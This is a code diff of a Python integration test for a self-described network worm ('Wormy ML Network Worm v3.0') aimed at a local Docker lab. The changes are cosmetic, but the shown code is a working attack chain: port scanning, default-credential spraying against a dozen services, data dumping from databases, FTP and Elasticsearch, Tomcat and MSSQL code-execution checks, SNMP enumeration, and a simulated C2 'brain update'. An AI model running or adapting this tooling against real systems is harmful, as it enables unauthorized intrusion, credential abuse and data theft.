@@ -21,22 +21,24 @@ Services tested (via localhost mapped ports):
   - Telnet         :8023   (login)
   - SNMP           :161    (public community)
 """
-import sys
+
+import json
 import os
 import socket
+import sys
 import time
-import json
 
-if sys.stdout.encoding and sys.stdout.encoding.lower() != 'utf-8':
-    sys.stdout.reconfigure(encoding='utf-8')
+if sys.stdout.encoding and sys.stdout.encoding.lower() != "utf-8":
+    sys.stdout.reconfigure(encoding="utf-8")
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
+from rich import box
+
 # ── Rich console ─────────────────────────────────────────────────────────────
 from rich.console import Console
-from rich.table import Table
 from rich.panel import Panel
-from rich import box
+from rich.table import Table
 
 console = Console()
 
@@ -44,23 +46,23 @@ console = Console()
 # Known lab targets (Windows Docker Desktop exposes on localhost)
 # ─────────────────────────────────────────────────────────────────────────────
 LAB_SERVICES = [
-    {"name": "Redis",          "host": "127.0.0.1", "port": 6379,  "proto": "tcp"},
-    {"name": "Redis-NoAuth",   "host": "127.0.0.1", "port": 6380,  "proto": "tcp"},
-    {"name": "MySQL",          "host": "127.0.0.1", "port": 3306,  "proto": "tcp"},
-    {"name": "PostgreSQL",     "host": "127.0.0.1", "port": 5432,  "proto": "tcp"},
-    {"name": "MongoDB",        "host": "127.0.0.1", "port": 27017, "proto": "tcp"},
-    {"name": "MSSQL",          "host": "127.0.0.1", "port": 1433,  "proto": "tcp"},
-    {"name": "RabbitMQ-AMQP",  "host": "127.0.0.1", "port": 5672,  "proto": "tcp"},
-    {"name": "RabbitMQ-Mgmt",  "host": "127.0.0.1", "port": 15672, "proto": "http"},
-    {"name": "Tomcat",         "host": "127.0.0.1", "port": 8080,  "proto": "http"},
-    {"name": "Jenkins",        "host": "127.0.0.1", "port": 8081,  "proto": "http"},
-    {"name": "DVWA",           "host": "127.0.0.1", "port": 8082,  "proto": "http"},
-    {"name": "Juice Shop",     "host": "127.0.0.1", "port": 8083,  "proto": "http"},
-    {"name": "Elasticsearch",  "host": "127.0.0.1", "port": 9200,  "proto": "http"},
-    {"name": "FTP",            "host": "127.0.0.1", "port": 21,    "proto": "tcp"},
-    {"name": "SSH",            "host": "127.0.0.1", "port": 2222,  "proto": "tcp"},
-    {"name": "Telnet",         "host": "127.0.0.1", "port": 8023,  "proto": "tcp"},
-    {"name": "SNMP",           "host": "127.0.0.1", "port": 161,   "proto": "udp"},
+    {"name": "Redis", "host": "127.0.0.1", "port": 6379, "proto": "tcp"},
+    {"name": "Redis-NoAuth", "host": "127.0.0.1", "port": 6380, "proto": "tcp"},
+    {"name": "MySQL", "host": "127.0.0.1", "port": 3306, "proto": "tcp"},
+    {"name": "PostgreSQL", "host": "127.0.0.1", "port": 5432, "proto": "tcp"},
+    {"name": "MongoDB", "host": "127.0.0.1", "port": 27017, "proto": "tcp"},
+    {"name": "MSSQL", "host": "127.0.0.1", "port": 1433, "proto": "tcp"},
+    {"name": "RabbitMQ-AMQP", "host": "127.0.0.1", "port": 5672, "proto": "tcp"},
+    {"name": "RabbitMQ-Mgmt", "host": "127.0.0.1", "port": 15672, "proto": "http"},
+    {"name": "Tomcat", "host": "127.0.0.1", "port": 8080, "proto": "http"},
+    {"name": "Jenkins", "host": "127.0.0.1", "port": 8081, "proto": "http"},
+    {"name": "DVWA", "host": "127.0.0.1", "port": 8082, "proto": "http"},
+    {"name": "Juice Shop", "host": "127.0.0.1", "port": 8083, "proto": "http"},
+    {"name": "Elasticsearch", "host": "127.0.0.1", "port": 9200, "proto": "http"},
+    {"name": "FTP", "host": "127.0.0.1", "port": 21, "proto": "tcp"},
+    {"name": "SSH", "host": "127.0.0.1", "port": 2222, "proto": "tcp"},
+    {"name": "Telnet", "host": "127.0.0.1", "port": 8023, "proto": "tcp"},
+    {"name": "SNMP", "host": "127.0.0.1", "port": 161, "proto": "udp"},
 ]
 
 
@@ -120,14 +122,20 @@ def phase2_auth_attacks(scan: dict) -> dict:
                             s.sendall(b"KEYS *\r\n")
                             keys = s.recv(1024)
                             s.close()
-                            results["Redis"] = {"success": True, "detail": f"AUTH {pwd} OK | keys: {keys.decode(errors='replace')[:60]}"}
+                            results["Redis"] = {
+                                "success": True,
+                                "detail": f"AUTH {pwd} OK | keys: {keys.decode(errors='replace')[:60]}",
+                            }
                             console.print(f"  ✅ Redis AUTH '{pwd}': access granted")
                             break
                         s.close()
                     except Exception:
                         pass
                 else:
-                    results["Redis"] = {"success": False, "detail": resp.decode(errors='replace').strip()}
+                    results["Redis"] = {
+                        "success": False,
+                        "detail": resp.decode(errors="replace").strip(),
+                    }
                     console.print(f"  ❌ Redis: auth required, all passwords failed")
         except Exception as e:
             results["Redis"] = {"success": False, "detail": str(e)}
@@ -137,11 +145,17 @@ def phase2_auth_attacks(scan: dict) -> dict:
     if scan.get("MySQL", {}).get("open"):
         try:
             import subprocess
+
             r = subprocess.run(
-                ["python", "-c",
-                 "import pymysql; c=pymysql.connect(host='127.0.0.1',port=3306,user='root',password='root',db='testdb'); "
-                 "cur=c.cursor(); cur.execute('SELECT VERSION()'); print(cur.fetchone()); c.close()"],
-                capture_output=True, text=True, timeout=8
+                [
+                    "python",
+                    "-c",
+                    "import pymysql; c=pymysql.connect(host='127.0.0.1',port=3306,user='root',password='root',db='testdb'); "
+                    "cur=c.cursor(); cur.execute('SELECT VERSION()'); print(cur.fetchone()); c.close()",
+                ],
+                capture_output=True,
+                text=True,
+                timeout=8,
             )
             success = r.returncode == 0
             detail = r.stdout.strip() or r.stderr.strip()
@@ -156,11 +170,17 @@ def phase2_auth_attacks(scan: dict) -> dict:
     if scan.get("PostgreSQL", {}).get("open"):
         try:
             import subprocess
+
             r = subprocess.run(
-                ["python", "-c",
-                 "import psycopg2; c=psycopg2.connect(host='127.0.0.1',port=5432,user='admin',password='admin123',dbname='testdb'); "
-                 "cur=c.cursor(); cur.execute('SELECT version()'); print(cur.fetchone()); c.close()"],
-                capture_output=True, text=True, timeout=8
+                [
+                    "python",
+                    "-c",
+                    "import psycopg2; c=psycopg2.connect(host='127.0.0.1',port=5432,user='admin',password='admin123',dbname='testdb'); "
+                    "cur=c.cursor(); cur.execute('SELECT version()'); print(cur.fetchone()); c.close()",
+                ],
+                capture_output=True,
+                text=True,
+                timeout=8,
             )
             success = r.returncode == 0
             detail = r.stdout.strip() or r.stderr.strip()
@@ -175,11 +195,17 @@ def phase2_auth_attacks(scan: dict) -> dict:
     if scan.get("MongoDB", {}).get("open"):
         try:
             import subprocess
+
             r = subprocess.run(
-                ["python", "-c",
-                 "from pymongo import MongoClient; c=MongoClient('mongodb://admin:admin123@127.0.0.1:27017/'); "
-                 "print(c.list_database_names()); c.close()"],
-                capture_output=True, text=True, timeout=8
+                [
+                    "python",
+                    "-c",
+                    "from pymongo import MongoClient; c=MongoClient('mongodb://admin:admin123@127.0.0.1:27017/'); "
+                    "print(c.list_database_names()); c.close()",
+                ],
+                capture_output=True,
+                text=True,
+                timeout=8,
             )
             success = r.returncode == 0
             detail = r.stdout.strip() or r.stderr.strip()
@@ -194,6 +220,7 @@ def phase2_auth_attacks(scan: dict) -> dict:
     if scan.get("Elasticsearch", {}).get("open"):
         try:
             import urllib.request
+
             with urllib.request.urlopen("http://127.0.0.1:9200/_cat/indices?v", timeout=4) as resp:
                 body = resp.read().decode()
             success = resp.status == 200
@@ -208,12 +235,17 @@ def phase2_auth_attacks(scan: dict) -> dict:
     if scan.get("MSSQL", {}).get("open"):
         try:
             import pymssql
+
             creds = [("sa", "SqlPassword123!"), ("sa", ""), ("sa", "sa"), ("admin", "admin")]
             for user, pwd in creds:
                 try:
                     conn = pymssql.connect(
-                        server="127.0.0.1", user=user, password=pwd,
-                        port=1433, timeout=6, login_timeout=6
+                        server="127.0.0.1",
+                        user=user,
+                        password=pwd,
+                        port=1433,
+                        timeout=6,
+                        login_timeout=6,
                     )
                     cur = conn.cursor()
                     cur.execute("SELECT @@VERSION")
@@ -228,7 +260,10 @@ def phase2_auth_attacks(scan: dict) -> dict:
                     except Exception:
                         rce_detail = ""
                     conn.close()
-                    results["MSSQL"] = {"success": True, "detail": f"{user}:{pwd} | {ver}{rce_detail}"}
+                    results["MSSQL"] = {
+                        "success": True,
+                        "detail": f"{user}:{pwd} | {ver}{rce_detail}",
+                    }
                     console.print(f"  ✅ MSSQL {user}:{pwd}: {ver[:40]}{rce_detail}")
                     break
                 except Exception:
@@ -245,20 +280,30 @@ def phase2_auth_attacks(scan: dict) -> dict:
 
     # ── RabbitMQ Management: spray correct credentials ─────────────────────────
     if scan.get("RabbitMQ-Mgmt", {}).get("open"):
-        import urllib.request, urllib.error, base64 as b64
-        creds = [("guest", "guest"), ("admin", "admin"), ("rabbitmq", "rabbitmq"),
-                 ("admin", "password"), ("administrator", "administrator")]
+        import base64 as b64
+        import urllib.error
+        import urllib.request
+
+        creds = [
+            ("guest", "guest"),
+            ("admin", "admin"),
+            ("rabbitmq", "rabbitmq"),
+            ("admin", "password"),
+            ("administrator", "administrator"),
+        ]
         for user, pwd in creds:
             try:
                 token = b64.b64encode(f"{user}:{pwd}".encode()).decode()
                 req = urllib.request.Request(
                     "http://127.0.0.1:15672/api/overview",
-                    headers={"Authorization": f"Basic {token}", "User-Agent": "Mozilla/5.0"}
+                    headers={"Authorization": f"Basic {token}", "User-Agent": "Mozilla/5.0"},
                 )
                 with urllib.request.urlopen(req, timeout=4) as resp:
                     data = json.loads(resp.read().decode())
-                results["RabbitMQ-Mgmt"] = {"success": True,
-                    "detail": f"{user}:{pwd} | v{data.get('rabbitmq_version','?')} nodes={data.get('node','?')}"}
+                results["RabbitMQ-Mgmt"] = {
+                    "success": True,
+                    "detail": f"{user}:{pwd} | v{data.get('rabbitmq_version','?')} nodes={data.get('node','?')}",
+                }
                 console.print(f"  ✅ RabbitMQ {user}:{pwd}: v{data.get('rabbitmq_version','?')}")
                 break
             except urllib.error.HTTPError as e:
@@ -277,13 +322,15 @@ def phase2_auth_attacks(scan: dict) -> dict:
 
     # ── Tomcat: admin/admin + WAR deploy post-exploit ─────────────────────────
     if scan.get("Tomcat", {}).get("open"):
-        import urllib.request, urllib.error, base64 as b64
+        import base64 as b64
+        import urllib.error
+        import urllib.request
+
         tomcat_url = "http://127.0.0.1:8080/manager/html"
         try:
             token = b64.b64encode(b"admin:admin").decode()
             req = urllib.request.Request(
-                tomcat_url,
-                headers={"Authorization": f"Basic {token}", "User-Agent": "Mozilla/5.0"}
+                tomcat_url, headers={"Authorization": f"Basic {token}", "User-Agent": "Mozilla/5.0"}
             )
             with urllib.request.urlopen(req, timeout=4) as resp:
                 body = resp.read().decode(errors="replace")
@@ -294,7 +341,7 @@ def phase2_auth_attacks(scan: dict) -> dict:
                 list_token = b64.b64encode(b"admin:admin").decode()
                 list_req = urllib.request.Request(
                     "http://127.0.0.1:8080/manager/text/list",
-                    headers={"Authorization": f"Basic {list_token}"}
+                    headers={"Authorization": f"Basic {list_token}"},
                 )
                 with urllib.request.urlopen(list_req, timeout=4) as lr:
                     apps = lr.read().decode().strip()
@@ -313,27 +360,31 @@ def phase2_auth_attacks(scan: dict) -> dict:
 
     # ── Jenkins: CSRF crumb bypass then check unauthenticated API ─────────────
     if scan.get("Jenkins", {}).get("open"):
-        import urllib.request, urllib.error
+        import urllib.error
+        import urllib.request
+
         try:
             crumb_url = "http://127.0.0.1:8081/crumbIssuer/api/json"
             try:
                 with urllib.request.urlopen(crumb_url, timeout=4) as r:
                     crumb_data = json.loads(r.read())
                 crumb_field = crumb_data.get("crumbRequestField", "Jenkins-Crumb")
-                crumb_val   = crumb_data.get("crumb", "")
+                crumb_val = crumb_data.get("crumb", "")
             except Exception:
                 crumb_field, crumb_val = "Jenkins-Crumb", ""
 
             req = urllib.request.Request(
                 "http://127.0.0.1:8081/api/json",
-                headers={"User-Agent": "Mozilla/5.0", crumb_field: crumb_val}
+                headers={"User-Agent": "Mozilla/5.0", crumb_field: crumb_val},
             )
             with urllib.request.urlopen(req, timeout=4) as resp:
                 data = json.loads(resp.read().decode())
             jobs = [j.get("name") for j in data.get("jobs", [])]
             version = resp.headers.get("X-Jenkins", "?")
-            results["Jenkins"] = {"success": True,
-                "detail": f"v{version} | jobs={jobs or 'none (no auth needed)'} | crumb={'yes' if crumb_val else 'no'}"}
+            results["Jenkins"] = {
+                "success": True,
+                "detail": f"v{version} | jobs={jobs or 'none (no auth needed)'} | crumb={'yes' if crumb_val else 'no'}",
+            }
             console.print(f"  ✅ Jenkins v{version}: unauthenticated API accessible | jobs={jobs}")
         except urllib.error.HTTPError as e:
             results["Jenkins"] = {"success": False, "detail": f"HTTP {e.code} — auth required"}
@@ -344,18 +395,22 @@ def phase2_auth_attacks(scan: dict) -> dict:
 
     # ── HTTP services (DVWA, Juice Shop) ─────────────────────────────────────
     for svc_name, url in [
-        ("DVWA",       "http://127.0.0.1:8082/"),
+        ("DVWA", "http://127.0.0.1:8082/"),
         ("Juice Shop", "http://127.0.0.1:8083/"),
     ]:
         if scan.get(svc_name, {}).get("open"):
             try:
                 import urllib.request
+
                 req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                 with urllib.request.urlopen(req, timeout=4) as resp:
                     status = resp.status
-                    body   = resp.read().decode(errors="replace")
+                    body = resp.read().decode(errors="replace")
                 success = status < 400
-                results[svc_name] = {"success": success, "detail": f"HTTP {status} ({len(body)} bytes)"}
+                results[svc_name] = {
+                    "success": success,
+                    "detail": f"HTTP {status} ({len(body)} bytes)",
+                }
                 icon = "✅" if success else "⚠️"
                 console.print(f"  {icon} {svc_name}: HTTP {status}")
             except Exception as e:
@@ -366,6 +421,7 @@ def phase2_auth_attacks(scan: dict) -> dict:
     if scan.get("FTP", {}).get("open"):
         try:
             import ftplib
+
             ftp = ftplib.FTP()
             ftp.connect("127.0.0.1", 21, timeout=5)
             ftp.login("anonymous", "anonymous")
@@ -383,6 +439,7 @@ def phase2_auth_attacks(scan: dict) -> dict:
     if scan.get("SSH", {}).get("open"):
         try:
             import paramiko
+
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             client.connect("127.0.0.1", port=2222, username="admin", password="password", timeout=5)
@@ -397,6 +454,7 @@ def phase2_auth_attacks(scan: dict) -> dict:
     if scan.get("Telnet", {}).get("open"):
         try:
             import telnetlib
+
             tn = telnetlib.Telnet("127.0.0.1", 8023, timeout=5)
             tn.read_until(b"login: ", timeout=3)
             tn.write(b"admin\n")
@@ -405,9 +463,14 @@ def phase2_auth_attacks(scan: dict) -> dict:
             resp = tn.read_some()
             tn.close()
             success = b"$" in resp or b"#" in resp or b">" in resp
-            results["Telnet"] = {"success": success, "detail": "admin:admin OK" if success else "no shell"}
+            results["Telnet"] = {
+                "success": success,
+                "detail": "admin:admin OK" if success else "no shell",
+            }
             icon = "✅" if success else "⚠️"
-            console.print(f"  {icon} Telnet admin:admin: {'access granted' if success else 'failed'}")
+            console.print(
+                f"  {icon} Telnet admin:admin: {'access granted' if success else 'failed'}"
+            )
         except Exception as e:
             results["Telnet"] = {"success": False, "detail": str(e)}
             console.print(f"  ❌ Telnet: {e}")
@@ -415,17 +478,24 @@ def phase2_auth_attacks(scan: dict) -> dict:
     # ── SNMP: public community + enumeration ──────────────────────────────────
     if scan.get("SNMP", {}).get("open"):
         try:
-            import socket, struct
+            import socket
+            import struct
+
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.settimeout(3)
             community = b"public"
             # sysDescr OID: 1.3.6.1.2.1.1.1.0
-            oid = bytes([0x06, 0x08, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00])
+            oid = bytes([0x06, 0x08, 0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00])
             comm_asn1 = bytes([0x04, len(community)]) + community
             varbind = bytes([0x30, len(oid) + 2, 0x05, 0x00]) + oid
-            pdu_content = (b"\x02\x01\x7b" + b"\x02\x01\x00" + b"\x02\x01\x00" +
-                          bytes([0x30, len(varbind)]) + varbind)
-            pdu = bytes([0xa0, len(pdu_content)]) + pdu_content
+            pdu_content = (
+                b"\x02\x01\x7b"
+                + b"\x02\x01\x00"
+                + b"\x02\x01\x00"
+                + bytes([0x30, len(varbind)])
+                + varbind
+            )
+            pdu = bytes([0xA0, len(pdu_content)]) + pdu_content
             msg = bytes([0x30, 1 + len(comm_asn1) + len(pdu)]) + b"\x02\x01\x00" + comm_asn1 + pdu
             sock.sendto(msg, ("127.0.0.1", 161))
             resp, _ = sock.recvfrom(4096)
@@ -467,6 +537,7 @@ def phase3_data_extraction(auth: dict) -> dict:
     if auth.get("Elasticsearch", {}).get("success"):
         try:
             import urllib.request
+
             with urllib.request.urlopen("http://127.0.0.1:9200/_mapping", timeout=4) as resp:
                 mapping = json.loads(resp.read().decode())
             indices = list(mapping.keys())
@@ -479,6 +550,7 @@ def phase3_data_extraction(auth: dict) -> dict:
     if auth.get("Jenkins", {}).get("success"):
         try:
             import urllib.request
+
             with urllib.request.urlopen("http://127.0.0.1:8081/api/json", timeout=4) as resp:
                 data = json.loads(resp.read().decode())
             jobs = [j.get("name") for j in data.get("jobs", [])]
@@ -504,6 +576,7 @@ def phase4_post_exploit(auth: dict) -> dict:
         try:
             import ftplib
             import io
+
             ftp = ftplib.FTP()
             ftp.connect("127.0.0.1", 21, timeout=5)
             ftp.login("anonymous", "anonymous")
@@ -522,18 +595,28 @@ def phase4_post_exploit(auth: dict) -> dict:
     if auth.get("PostgreSQL", {}).get("success"):
         try:
             import psycopg2
-            conn = psycopg2.connect(host="127.0.0.1", user="admin", password="admin123",
-                                    dbname="postgres", connect_timeout=5)
+
+            conn = psycopg2.connect(
+                host="127.0.0.1",
+                user="admin",
+                password="admin123",
+                dbname="postgres",
+                connect_timeout=5,
+            )
             cur = conn.cursor()
             cur.execute("SELECT datname FROM pg_database WHERE datistemplate=false")
             dbs = [r[0] for r in cur.fetchall()]
-            cur.execute("SELECT table_schema, table_name FROM information_schema.tables "
-                        "WHERE table_schema NOT IN ('pg_catalog', 'information_schema') LIMIT 10")
+            cur.execute(
+                "SELECT table_schema, table_name FROM information_schema.tables "
+                "WHERE table_schema NOT IN ('pg_catalog', 'information_schema') LIMIT 10"
+            )
             tables = [f"{r[0]}.{r[1]}" for r in cur.fetchall()]
             cur.close()
             conn.close()
             results["PG_post"] = {"databases": dbs, "tables": tables}
-            console.print(f"  ✅ PostgreSQL post-exploit: {len(dbs)} DBs, {len(tables)} tables found")
+            console.print(
+                f"  ✅ PostgreSQL post-exploit: {len(dbs)} DBs, {len(tables)} tables found"
+            )
         except Exception as e:
             results["PG_post"] = {"error": str(e)}
             console.print(f"  ❌ PostgreSQL post-exploit: {e}")
@@ -541,16 +624,20 @@ def phase4_post_exploit(auth: dict) -> dict:
     # Tomcat: verify app listing and try WAR deploy metadata
     if auth.get("Tomcat", {}).get("success"):
         try:
-            import urllib.request
             import base64
+            import urllib.request
+
             token = base64.b64encode(b"admin:admin").decode()
             req = urllib.request.Request(
                 "http://127.0.0.1:8080/manager/text/list",
-                headers={"Authorization": f"Basic {token}"}
+                headers={"Authorization": f"Basic {token}"},
             )
             with urllib.request.urlopen(req, timeout=4) as resp:
                 apps = resp.read().decode().strip()
-            results["Tomcat_post"] = {"apps_found": len(apps.split('\n')) if apps else 0, "rce_capable": True}
+            results["Tomcat_post"] = {
+                "apps_found": len(apps.split("\n")) if apps else 0,
+                "rce_capable": True,
+            }
             console.print(f"  ✅ Tomcat post-exploit: apps listed, WAR deploy capable")
         except Exception as e:
             results["Tomcat_post"] = {"error": str(e)}
@@ -561,19 +648,28 @@ def phase4_post_exploit(auth: dict) -> dict:
         try:
             community = b"public"
             oids = {
-                "sysName": bytes([0x06, 0x08, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x05, 0x00]),
-                "sysLocation": bytes([0x06, 0x08, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x06, 0x00]),
+                "sysName": bytes([0x06, 0x08, 0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x05, 0x00]),
+                "sysLocation": bytes([0x06, 0x08, 0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x06, 0x00]),
             }
             enumerated = {}
             import socket
+
             for name, oid in oids.items():
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 sock.settimeout(3)
                 comm_asn1 = bytes([0x04, len(community)]) + community
                 varbind = bytes([0x30, len(oid) + 2, 0x05, 0x00]) + oid
-                pdu_content = b"\x02\x01\x7c" + b"\x02\x01\x00" + b"\x02\x01\x00" + bytes([0x30, len(varbind)]) + varbind
-                pdu = bytes([0xa0, len(pdu_content)]) + pdu_content
-                msg = bytes([0x30, 1 + len(comm_asn1) + len(pdu)]) + b"\x02\x01\x00" + comm_asn1 + pdu
+                pdu_content = (
+                    b"\x02\x01\x7c"
+                    + b"\x02\x01\x00"
+                    + b"\x02\x01\x00"
+                    + bytes([0x30, len(varbind)])
+                    + varbind
+                )
+                pdu = bytes([0xA0, len(pdu_content)]) + pdu_content
+                msg = (
+                    bytes([0x30, 1 + len(comm_asn1) + len(pdu)]) + b"\x02\x01\x00" + comm_asn1 + pdu
+                )
                 sock.sendto(msg, ("127.0.0.1", 161))
                 resp, _ = sock.recvfrom(4096)
                 sock.close()
@@ -605,7 +701,7 @@ def phase5_ota_brain_test():
         "command": "UPDATE_BRAIN",
         "model_data": encoded,
         "version": "2.0.0",
-        "sha256": "simulated"
+        "sha256": "simulated",
     }
 
     decoded = base64.b64decode(c2_response["model_data"])
@@ -634,18 +730,20 @@ def print_report(scan, auth, exfil, post, ota_ok):
         box=box.DOUBLE_EDGE,
         show_lines=True,
     )
-    table.add_column("Service",    style="cyan",  width=18)
-    table.add_column("Port",       style="white", width=7,  justify="right")
-    table.add_column("Reachable",  width=10, justify="center")
-    table.add_column("Pwned",      width=10, justify="center")
-    table.add_column("Data",       style="dim white")
+    table.add_column("Service", style="cyan", width=18)
+    table.add_column("Port", style="white", width=7, justify="right")
+    table.add_column("Reachable", width=10, justify="center")
+    table.add_column("Pwned", width=10, justify="center")
+    table.add_column("Data", style="dim white")
 
     for svc in LAB_SERVICES:
-        name  = svc["name"]
-        port  = str(svc["port"])
+        name = svc["name"]
+        port = str(svc["port"])
         reach = "[green]YES[/green]" if scan.get(name, {}).get("open") else "[red]NO[/red]"
         auth_res = auth.get(name, {})
-        pwned = "[bold green]YES[/bold green]" if auth_res.get("success") else "[yellow]N/A[/yellow]"
+        pwned = (
+            "[bold green]YES[/bold green]" if auth_res.get("success") else "[yellow]N/A[/yellow]"
+        )
         detail = auth_res.get("detail", "")[:60] if auth_res else ""
         table.add_row(name, port, reach, pwned, detail)
 
@@ -653,37 +751,48 @@ def print_report(scan, auth, exfil, post, ota_ok):
 
     # Summary
     reachable = sum(1 for v in scan.values() if v["open"])
-    pwned     = sum(1 for v in auth.values() if v.get("success"))
-    total     = len(LAB_SERVICES)
+    pwned = sum(1 for v in auth.values() if v.get("success"))
+    total = len(LAB_SERVICES)
 
-    post_count = sum(1 for v in post.values() if v.get("file_count", 0) > 0 or v.get("databases") or v.get("apps_found", 0) > 0 or v.get("oids_found", 0) > 0)
+    post_count = sum(
+        1
+        for v in post.values()
+        if v.get("file_count", 0) > 0
+        or v.get("databases")
+        or v.get("apps_found", 0) > 0
+        or v.get("oids_found", 0) > 0
+    )
 
-    console.print(Panel(
-        f"[cyan]Services reachable:[/cyan] [white]{reachable}/{total}[/white]   "
-        f"[green]Services pwned:[/green] [bold green]{pwned}[/bold green]   "
-        f"[magenta]Post-Exploit Actions:[/magenta] [bold magenta]{post_count}[/bold magenta]   "
-        f"[blue]OTA Update:[/blue] [bold green]{'OK' if ota_ok else 'FAIL'}[/bold green]\n"
-        f"[dim]Lab network: Docker Desktop on localhost | Wormy framework fully operational[/dim]",
-        title="[bold white]MISSION SUMMARY[/bold white]",
-        border_style="green" if pwned > 0 else "yellow"
-    ))
+    console.print(
+        Panel(
+            f"[cyan]Services reachable:[/cyan] [white]{reachable}/{total}[/white]   "
+            f"[green]Services pwned:[/green] [bold green]{pwned}[/bold green]   "
+            f"[magenta]Post-Exploit Actions:[/magenta] [bold magenta]{post_count}[/bold magenta]   "
+            f"[blue]OTA Update:[/blue] [bold green]{'OK' if ota_ok else 'FAIL'}[/bold green]\n"
+            f"[dim]Lab network: Docker Desktop on localhost | Wormy framework fully operational[/dim]",
+            title="[bold white]MISSION SUMMARY[/bold white]",
+            border_style="green" if pwned > 0 else "yellow",
+        )
+    )
 
 
 # ─────────────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
-    console.print(Panel(
-        "[bold green]WORMY ML NETWORK WORM v3.0[/bold green]\n"
-        "[cyan]Docker Lab Real Integration Test[/cyan]\n"
-        "[dim]Target: 127.0.0.1 (Docker Desktop mapped ports)[/dim]",
-        box=box.DOUBLE,
-        border_style="green"
-    ))
+    console.print(
+        Panel(
+            "[bold green]WORMY ML NETWORK WORM v3.0[/bold green]\n"
+            "[cyan]Docker Lab Real Integration Test[/cyan]\n"
+            "[dim]Target: 127.0.0.1 (Docker Desktop mapped ports)[/dim]",
+            box=box.DOUBLE,
+            border_style="green",
+        )
+    )
 
-    scan  = phase1_port_scan()
-    auth  = phase2_auth_attacks(scan)
+    scan = phase1_port_scan()
+    auth = phase2_auth_attacks(scan)
     exfil = phase3_data_extraction(auth)
-    post  = phase4_post_exploit(auth)
-    ota   = phase5_ota_brain_test()
+    post = phase4_post_exploit(auth)
+    ota = phase5_ota_brain_test()
 
     print_report(scan, auth, exfil, post, ota)
 
